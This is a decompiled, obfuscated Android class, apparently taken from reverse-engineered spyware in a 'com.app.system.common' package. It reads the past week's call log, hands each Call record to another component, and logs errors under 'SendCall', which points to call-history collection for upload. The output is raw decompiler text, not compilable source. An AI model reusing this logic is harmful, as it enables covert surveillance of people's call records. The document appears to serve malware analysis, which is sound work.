package com.app.system.common.f;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.app.system.common.a.b;
import com.app.system.common.entity.Call;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class d
  extends a
{
  public static int a(Context paramContext, long paramLong)
  {
    try
    {
      SharedPreferences.Editor localEditor = paramContext.getSharedPreferences("pref", 0).edit();
      long l = paramLong;
      if (paramLong <= 0L)
      {
        localObject1 = new java/util/Date;
        ((Date)localObject1).<init>();
        l = ((Date)localObject1).getTime() / 1000L - 604800L;
      }
      b localb = new com/app/system/common/a/b;
      localb.<init>(paramContext);
      Object localObject2 = new java/util/Date;
      ((Date)localObject2).<init>((1L + l) * 1000L);
      Object localObject1 = new java/util/Date;
      ((Date)localObject1).<init>();
      localObject2 = localb.a(false, (Date)localObject2, (Date)localObject1);
      if ((localObject2 != null) && (((List)localObject2).size() > 0))
      {
        localObject1 = new com/app/system/common/h/d;
        ((com.app.system.common.h.d)localObject1).<init>(paramContext);
        paramContext = ((List)localObject2).iterator();
        for (paramLong = 0L; paramContext.hasNext(); paramLong = ((Call)localObject2).b())
        {
          label134:
          localObject2 = (Call)paramContext.next();
          if ((localObject2 == null) || (((Call)localObject2).b() <= l)) {
            break label134;
          }
          ((com.app.system.common.h.d)localObject1).a((Call)localObject2);
        }
        if (paramLong > 0L)
        {
          paramContext = new java/util/Date;
          paramContext.<init>();
          localEditor.putLong("last-call-date", paramContext.getTime() / 1000L);
          localEditor.commit();
        }
      }
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendCall", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/f/d.class
 *
 * Reversed by:           J
 */